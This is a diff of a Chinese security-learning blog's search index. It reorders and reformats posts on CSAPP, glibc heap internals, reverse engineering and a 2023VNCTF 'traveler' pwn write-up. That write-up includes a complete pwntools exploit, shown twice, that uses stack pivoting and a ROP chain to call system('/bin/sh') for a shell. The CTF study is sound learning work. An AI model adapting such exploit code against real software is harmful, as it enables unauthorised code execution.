@@ -29,31 +29,7 @@
       </tags>
   </entry>
   <entry>
-    <title>2023VNCTF-traveler</title>
-    <url>/2023/05/12/2023VNCTF-traveler/</url>
-    <content><![CDATA[<h1 id="2023VNCTF-traveler"><a href="#2023VNCTF-traveler" class="headerlink" title="2023VNCTF-traveler"></a><font size = 10 color = 'orange'>2023VNCTF-traveler</font></h1><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p>首先老传统手艺：checksec一下：<br><img src=https://s2.loli.net/2023/05/12/N1jST5JCWyY793b.png><br>好家伙，就一个栈不可执行，<del>感觉应该不是很难</del>直接拖进IDA逆向看看</p>
-<p>逆向文件：<br><img src =https://s2.loli.net/2023/05/12/wiySZc1LbF5GVme.png><br>可以看到有明显的栈溢出点： <code>buf[32]</code>和<code>read(0,&amp;buf,48ull)</code><br>一看刚好溢出两个字节，再看程序，哇塞有个后门函数<img src = https://s2.loli.net/2023/05/12/rlmnwUByu5qLYeG.png><br>直接ret2text（只能说我是真单纯）。后面发现怎么样也打不通，再仔细一看，哇塞！原来是<font size =4><code>echo flag</code></font>（只能说离了个大谱）</p>
-<p>看来果然没那么简单，要不然我说为什么还多给了个<code>msg</code> ？看来只能另辟蹊径了。后来仔细分析了下，程序就只给了两字节的溢出值，根本就没办法制造什么ROP链，欸，等等，溢出<font size = 4 color = red face = '楷体'>两字节</font>这不刚好可以覆盖prev_rbp和ret_addr这两个地址值，所以这道应该是栈迁移。</p>
-<h2 id="2-exp构造"><a href="#2-exp构造" class="headerlink" title="2.exp构造"></a>2.exp构造</h2><p>先给出exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">fake_stack = <span class="number">0x404d00</span></span><br><span class="line">read = <span class="number">0x401216</span> </span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p_rdi = <span class="number">0x4012c3</span></span><br><span class="line">leave = <span class="number">0x401253</span></span><br><span class="line">bss = <span class="number">0x4040a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pid&quot;</span>+<span class="built_in">str</span>(proc.pidof(io)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;u?\n&quot;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(fake_stack+<span class="number">0x20</span>)+p64(read)</span><br><span class="line">io.send(p1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p3 = p64(p_rdi) + p64(bss) + p64(sys_addr) + p64(<span class="number">0</span>) + p64(fake_stack-<span class="number">0x08</span>) + p64(leave)</span><br><span class="line">io.send(p3)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<img src = https://s2.loli.net/2023/05/12/H5tJf8gQrAwkN2m.png>
-先构造一个`fake_stack`（也就是我们栈迁移处），然后再控制我们的rip（0x401216）回到我们的程序流。这时候我们就开辟了一个fake_stack空间。然后这时，我们就可以向这个fake_stack上构造我们的rop链了。
-
-<h2 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h2><img src = https://s2.loli.net/2023/05/12/Cp9XLYcZFkdbPVu.png>
-
-<p>这道题来自VNCTF，最后附上题目作者的出题手记：<a href="https://kotoriseed.github.io/post/vnctf2023-pwn/#exp">https://kotoriseed.github.io/post/vnctf2023-pwn/#exp</a><br>看到作者提到了ogg法，我甚是好奇，等我学会了再回来进行更新。</p>
-<font size =2 face=楷体 color = red >
-特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
-      <categories>
-        <category>pwn学习</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSAPP Lesson 1</title>
+    <title>CSAPP-Lesson-1</title>
     <url>/2023/05/07/CSAPP-Lesson-1/</url>
     <content><![CDATA[<h1 id="Gist-of-Lesson-1"><a href="#Gist-of-Lesson-1" class="headerlink" title="Gist of Lesson 1"></a><strong>Gist of Lesson 1</strong></h1><hr>
 <p><em>摘要：这是笔者正式学习CMU的CSAPP教程的过程总结，是属于<font color = #ffa500 face ="楷体" size = 5>边学边看</font>的方式进行写作。看看学完之后的自己和学之前的自己再操作系统上的理解有什么改变和提高，同时记录下初学者在进行学习时最开始的感受，以初学者的视角，记录下这门课程的真是学习经历</em></p>
@@ -90,6 +66,30 @@
       </categories>
       <tags>
         <tag>CSAPP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023VNCTF-traveler</title>
+    <url>/2023/05/12/2023VNCTF-traveler/</url>
+    <content><![CDATA[<h1 id="2023VNCTF-traveler"><a href="#2023VNCTF-traveler" class="headerlink" title="2023VNCTF-traveler"></a><font size = 10 color = 'orange'>2023VNCTF-traveler</font></h1><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p>首先老传统手艺：checksec一下：<br><img src=https://s2.loli.net/2023/05/12/N1jST5JCWyY793b.png><br>好家伙，就一个栈不可执行，<del>感觉应该不是很难</del>直接拖进IDA逆向看看</p>
+<p>逆向文件：<br><img src =https://s2.loli.net/2023/05/12/wiySZc1LbF5GVme.png><br>可以看到有明显的栈溢出点： <code>buf[32]</code>和<code>read(0,&amp;buf,48ull)</code><br>一看刚好溢出两个字节，再看程序，哇塞有个后门函数<img src = https://s2.loli.net/2023/05/12/rlmnwUByu5qLYeG.png><br>直接ret2text（只能说我是真单纯）。后面发现怎么样也打不通，再仔细一看，哇塞！原来是<font size =4><code>echo flag</code></font>（只能说离了个大谱）</p>
+<p>看来果然没那么简单，要不然我说为什么还多给了个<code>msg</code> ？看来只能另辟蹊径了。后来仔细分析了下，程序就只给了两字节的溢出值，根本就没办法制造什么ROP链，欸，等等，溢出<font size = 4 color = red face = '楷体'>两字节</font>这不刚好可以覆盖prev_rbp和ret_addr这两个地址值，所以这道应该是栈迁移。</p>
+<h2 id="2-exp构造"><a href="#2-exp构造" class="headerlink" title="2.exp构造"></a>2.exp构造</h2><p>先给出exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">fake_stack = <span class="number">0x404d00</span></span><br><span class="line">read = <span class="number">0x401216</span> </span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p_rdi = <span class="number">0x4012c3</span></span><br><span class="line">leave = <span class="number">0x401253</span></span><br><span class="line">bss = <span class="number">0x4040a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pid&quot;</span>+<span class="built_in">str</span>(proc.pidof(io)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;u?\n&quot;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(fake_stack+<span class="number">0x20</span>)+p64(read)</span><br><span class="line">io.send(p1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p3 = p64(p_rdi) + p64(bss) + p64(sys_addr) + p64(<span class="number">0</span>) + p64(fake_stack-<span class="number">0x08</span>) + p64(leave)</span><br><span class="line">io.send(p3)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<img src = https://s2.loli.net/2023/05/12/H5tJf8gQrAwkN2m.png>
+先构造一个`fake_stack`（也就是我们栈迁移处），然后再控制我们的rip（0x401216）回到我们的程序流。这时候我们就开辟了一个fake_stack空间。然后这时，我们就可以向这个fake_stack上构造我们的rop链了。
+
+<h2 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h2><img src = https://s2.loli.net/2023/05/12/Cp9XLYcZFkdbPVu.png>
+
+<p>这道题来自VNCTF，最后附上题目作者的出题手记：<a href="https://kotoriseed.github.io/post/vnctf2023-pwn/#exp">https://kotoriseed.github.io/post/vnctf2023-pwn/#exp</a><br>看到作者提到了ogg法，我甚是好奇，等我学会了再回来进行更新。</p>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
+      <categories>
+        <category>pwn学习</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>wp</tag>
       </tags>
   </entry>
   <entry>
@@ -227,70 +227,12 @@
 <font size =2 face=楷体 color = red >
 特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
       <categories>
-        <category>-pwn学习</category>
+        <category>pwn学习</category>
       </categories>
       <tags>
-        <tag>-pwn -堆利用 -unlink</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>堆基础</title>
-    <url>/2023/06/19/%E5%A0%86%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1 id="堆基础复习"><a href="#堆基础复习" class="headerlink" title="堆基础复习"></a>堆基础复习</h1><p><font size = 2 face=楷体>本来是不因该有本篇博客的，但自从备考期末那段时间之后，对于堆的知识点有点忘记了，所以更新本篇，方便日后再复习。这里的绝大部分笔记都是来自我听课时做下的笔记。</font></p>
-<hr>
-<h2 id="1-堆管理器-Arena"><a href="#1-堆管理器-Arena" class="headerlink" title="1.堆管理器(Arena)"></a>1.堆管理器(Arena)</h2><p><font size =2 face =楷体>What is it：堆管理器并非由操作系统实现，而是由libc.so.6链接库实现。它封装了一些系统调用，为用户提供方便的动态内存分布接口的同时，力求高效地管理由系统调用申请来的内存。<br></font></p>
-<hr>
-<p><font size=5 face=宋体>Linux下的堆管理器：</font></p>
-<h3 id="申请内存的系统调用函数有："><a href="#申请内存的系统调用函数有：" class="headerlink" title="申请内存的系统调用函数有："></a>申请内存的系统调用函数有：</h3><p>1.brk函数(break)</p>
-<p>2.mmap(memory map：内存映射) mmap处既储存堆，也储存shared library</p>
-<font size =3 face =楷体>
-
-<p>主线程申请堆空间调用函数：brk、mmap</p>
-<p>子线程申请堆空间调用函数：mmap</p>
-</font>
-
-<hr>
-<h3 id="内存分配区"><a href="#内存分配区" class="headerlink" title="内存分配区"></a>内存分配区</h3><p>内存分配区，可以理解为堆管理器所持有的内存池。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统 ——&gt; 堆管理器 ——&gt; 用户</span><br><span class="line"></span><br><span class="line">物理内存 ——&gt;  arena  ——&gt; 可用内存</span><br></pre></td></tr></table></figure>
-<pre><code>堆管理器与用户的内存交易发生在arena中
-</code></pre>
-<p>内存分配区：可以理解为堆管理器像操作系统批发来的冗余的内存库存</p>
-<p>一个进程可以有多个arena，因为一个进程是由多个线程构成的。</p>
-<p>创造一个进程，操作系统会生成一个新的虚拟内存，并发配一个进程号(PID)，是分配资源的基本单位。</p>
-<hr>
-<h2 id="2-堆块-chunk"><a href="#2-堆块-chunk" class="headerlink" title="2.堆块(chunk)"></a>2.堆块(chunk)</h2><h3 id="chunk的结构"><a href="#chunk的结构" class="headerlink" title="chunk的结构"></a>chunk的结构</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位。</p>
-<p>malloc()返回的指针指向一个chunk的数据区域</p>
-<img src=https://s2.loli.net/2023/06/19/bkKq3BaSePI5HtN.png>
-
-<p><img scr="https://smms.app/image/rWRSop76HKV5BAU" target="_blank"><img src="https://s2.loli.net/2023/06/19/rWRSop76HKV5BAU.png" alt="malloced chunk size指向.png"></p>
-<hr>
-<h3 id="free-chunk-的过程"><a href="#free-chunk-的过程" class="headerlink" title="free chunk 的过程"></a>free chunk 的过程</h3><img src = https://s2.loli.net/2023/06/19/3gyEDQcJSC6AxeM.png>
-
-<p>注意，这里只是把下一个chunk的prev-inuse位置改为0。并在bins链表加上该chunk的地址。并不是把内存清空。</p>
-<h3 id="prev-size的复用"><a href="#prev-size的复用" class="headerlink" title="prev size的复用"></a>prev size的复用</h3><p>prev size的复用：因为prev size是记录上一个chunk的大小值。如果上一个chunk是在使用之中的话，此时下一个chunk的prev size就没有作用了，所以系统为了节省空间，就会把这一个字节给利用上。</p>
-<p>所以：malloc(0xn8)和malloc(0xn0)所申请得到的两个chunk大小在使用时是一样的。</p>
-<h3 id="chunk的类型"><a href="#chunk的类型" class="headerlink" title="chunk的类型"></a>chunk的类型</h3><img src=https://s2.loli.net/2023/06/19/gqwxackF1TVGrp6.png>
-
-<h2 id="3-bins链表"><a href="#3-bins链表" class="headerlink" title="3.bins链表"></a>3.bins链表</h2><p>管理arena中空闲chunk的结构</p>
-<p>以数组的形式存在，数组元素为相对应大小的chunk链表的链表头。</p>
-<p>bins的类型有</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">· unsorted bins             </span><br><span class="line">· fast bins                 0x20~0x80</span><br><span class="line">· small bins</span><br><span class="line">· large bins</span><br><span class="line">· tcache</span><br></pre></td></tr></table></figure>
-
-<p>注意：free掉的chunk，如果是在0x20~0x80之间的先放在fastbins里，大于0x80的先放在unsorted bins中，等需要调用chunk时，系统先从unsorted bins中历遍，边寻找边把unsorted bins中的chunk分类</p>
-<p>fast bins结构：</p>
-<img src=https://s2.loli.net/2023/06/20/M3lKR6Z1ONdVYSf.png>
-
-<p>small bins结构：</p>
-<img src=https://s2.loli.net/2023/06/20/q5NtlJyDViSd1eg.png>
-
-<p>注意：fastbins为单链表存储。unsortedbin、smallbins、largebins都是双向循环链表存储。</p>
-<font size =2 face=楷体 color = red >
-特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
-      <categories>
-        <category>-pwn学习</category>
-      </categories>
-      <tags>
-        <tag>-pwn -堆利用 -chunk结构</tag>
+        <tag>pwn</tag>
+        <tag>堆利用</tag>
+        <tag>unlink</tag>
       </tags>
   </entry>
   <entry>
@@ -363,13 +305,15 @@
 <img src=https://s2.loli.net/2023/06/20/1sZGV7v65oiXagB.png>
 
 <p>以及一张我珍藏已久的好图,是汇编语言下的函数调用栈。(好像是我截自ctfwiki上的图)</p>
+<p>明天要复习准备期末考了，又要断更一会了。ᕦ༼༎ຶ_༎ຶ༽ᕗ</p>
 <font size =2 face=楷体 color = red >
 特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
       <categories>
-        <category>-逆向学习</category>
+        <category>逆向学习</category>
       </categories>
       <tags>
-        <tag>-re -逆向学习</tag>
+        <tag>re</tag>
+        <tag>逆向学习</tag>
       </tags>
   </entry>
   <entry>
@@ -382,10 +326,72 @@
 <p>资源仅供学习交流使用，请在参考后的24小时内删除，如有侵权请联系删除。</p>
 ]]></content>
       <categories>
-        <category>-高数学习</category>
+        <category>高数学习</category>
       </categories>
       <tags>
-        <tag>-高数学习</tag>
+        <tag>高数学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>堆基础</title>
+    <url>/2023/06/19/%E5%A0%86%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="堆基础复习"><a href="#堆基础复习" class="headerlink" title="堆基础复习"></a>堆基础复习</h1><p><font size = 2 face=楷体>本来是不因该有本篇博客的，但自从备考期末那段时间之后，对于堆的知识点有点忘记了，所以更新本篇，方便日后再复习。这里的绝大部分笔记都是来自我听课时做下的笔记。</font></p>
+<hr>
+<h2 id="1-堆管理器-Arena"><a href="#1-堆管理器-Arena" class="headerlink" title="1.堆管理器(Arena)"></a>1.堆管理器(Arena)</h2><p><font size =2 face =楷体>What is it：堆管理器并非由操作系统实现，而是由libc.so.6链接库实现。它封装了一些系统调用，为用户提供方便的动态内存分布接口的同时，力求高效地管理由系统调用申请来的内存。<br></font></p>
+<hr>
+<p><font size=5 face=宋体>Linux下的堆管理器：</font></p>
+<h3 id="申请内存的系统调用函数有："><a href="#申请内存的系统调用函数有：" class="headerlink" title="申请内存的系统调用函数有："></a>申请内存的系统调用函数有：</h3><p>1.brk函数(break)</p>
+<p>2.mmap(memory map：内存映射) mmap处既储存堆，也储存shared library</p>
+<font size =3 face =楷体>
+
+<p>主线程申请堆空间调用函数：brk、mmap</p>
+<p>子线程申请堆空间调用函数：mmap</p>
+</font>
+
+<hr>
+<h3 id="内存分配区"><a href="#内存分配区" class="headerlink" title="内存分配区"></a>内存分配区</h3><p>内存分配区，可以理解为堆管理器所持有的内存池。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统 ——&gt; 堆管理器 ——&gt; 用户</span><br><span class="line"></span><br><span class="line">物理内存 ——&gt;  arena  ——&gt; 可用内存</span><br></pre></td></tr></table></figure>
+<pre><code>堆管理器与用户的内存交易发生在arena中
+</code></pre>
+<p>内存分配区：可以理解为堆管理器像操作系统批发来的冗余的内存库存</p>
+<p>一个进程可以有多个arena，因为一个进程是由多个线程构成的。</p>
+<p>创造一个进程，操作系统会生成一个新的虚拟内存，并发配一个进程号(PID)，是分配资源的基本单位。</p>
+<hr>
+<h2 id="2-堆块-chunk"><a href="#2-堆块-chunk" class="headerlink" title="2.堆块(chunk)"></a>2.堆块(chunk)</h2><h3 id="chunk的结构"><a href="#chunk的结构" class="headerlink" title="chunk的结构"></a>chunk的结构</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位。</p>
+<p>malloc()返回的指针指向一个chunk的数据区域</p>
+<img src=https://s2.loli.net/2023/06/19/bkKq3BaSePI5HtN.png>
+
+<p><img scr="https://smms.app/image/rWRSop76HKV5BAU" target="_blank"><img src="https://s2.loli.net/2023/06/19/rWRSop76HKV5BAU.png" alt="malloced chunk size指向.png"></p>
+<hr>
+<h3 id="free-chunk-的过程"><a href="#free-chunk-的过程" class="headerlink" title="free chunk 的过程"></a>free chunk 的过程</h3><img src = https://s2.loli.net/2023/06/19/3gyEDQcJSC6AxeM.png>
+
+<p>注意，这里只是把下一个chunk的prev-inuse位置改为0。并在bins链表加上该chunk的地址。并不是把内存清空。</p>
+<h3 id="prev-size的复用"><a href="#prev-size的复用" class="headerlink" title="prev size的复用"></a>prev size的复用</h3><p>prev size的复用：因为prev size是记录上一个chunk的大小值。如果上一个chunk是在使用之中的话，此时下一个chunk的prev size就没有作用了，所以系统为了节省空间，就会把这一个字节给利用上。</p>
+<p>所以：malloc(0xn8)和malloc(0xn0)所申请得到的两个chunk大小在使用时是一样的。</p>
+<h3 id="chunk的类型"><a href="#chunk的类型" class="headerlink" title="chunk的类型"></a>chunk的类型</h3><img src=https://s2.loli.net/2023/06/19/gqwxackF1TVGrp6.png>
+
+<h2 id="3-bins链表"><a href="#3-bins链表" class="headerlink" title="3.bins链表"></a>3.bins链表</h2><p>管理arena中空闲chunk的结构</p>
+<p>以数组的形式存在，数组元素为相对应大小的chunk链表的链表头。</p>
+<p>bins的类型有</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">· unsorted bins             </span><br><span class="line">· fast bins                 0x20~0x80</span><br><span class="line">· small bins</span><br><span class="line">· large bins</span><br><span class="line">· tcache</span><br></pre></td></tr></table></figure>
+
+<p>注意：free掉的chunk，如果是在0x20~0x80之间的先放在fastbins里，大于0x80的先放在unsorted bins中，等需要调用chunk时，系统先从unsorted bins中历遍，边寻找边把unsorted bins中的chunk分类</p>
+<p>fast bins结构：</p>
+<img src=https://s2.loli.net/2023/06/20/M3lKR6Z1ONdVYSf.png>
+
+<p>small bins结构：</p>
+<img src=https://s2.loli.net/2023/06/20/q5NtlJyDViSd1eg.png>
+
+<p>注意：fastbins为单链表存储。unsortedbin、smallbins、largebins都是双向循环链表存储。</p>
+<font size =2 face=楷体 color = red >
+特别注意: 本站(lkjack.com)所有文章仅供技术学习与研究，若将其信息做其他用途，由用户本身承担全部法律及连带责任，本站不承担任何法律及连带责任，请务必遵守相关国家安全法律。</font>]]></content>
+      <categories>
+        <category>pwn学习</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>堆利用</tag>
+        <tag>chunk结构</tag>
       </tags>
   </entry>
 </search>
